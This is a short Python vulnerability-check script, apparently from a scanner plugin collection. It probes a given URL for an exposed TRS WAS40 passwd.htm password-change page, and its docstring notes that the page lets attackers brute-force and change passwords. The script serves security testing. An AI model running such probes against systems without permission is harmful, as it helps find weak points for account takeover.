#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: TRS was40 passwd.htm页面泄露
referer: http://www.wooyun.org/bugs/wooyun-2013-38875
author: Lucifer
description: 文件passwd.htm泄露,攻击者可爆破修改密码。
'''
import sys
import requests
import warnings
from termcolor import cprint

class trs_was40_passwd_disclosure_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/was40/passwd/passwd.htm"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if req.status_code == 200 and r"userPassword" in req.text and r"domodifypassword.jsp" in req.text:
                cprint("[+]存在TRS was40 passwd.htm页面泄露...(中危)\tpayload: "+vulnurl, "yellow")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = trs_was40_passwd_disclosure_BaseVerify(sys.argv[1])
    testVuln.run()